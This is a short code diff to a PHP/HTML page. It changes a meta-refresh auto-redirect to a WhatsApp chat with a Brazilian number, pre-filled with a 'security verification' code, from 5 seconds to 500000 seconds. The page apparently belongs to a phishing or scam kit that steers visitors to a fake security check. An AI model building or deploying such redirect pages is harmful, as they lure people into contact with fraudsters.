@@ -293,7 +293,7 @@ session_start();
         <a href="https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
             <img src="../../assets/imgs/whatsapp.png" class="blink" width="100%">
         </a>
-        <meta http-equiv="REFRESH" content="5; url=https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
+        <meta http-equiv="REFRESH" content="500000; url=https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
 
 
     </div>
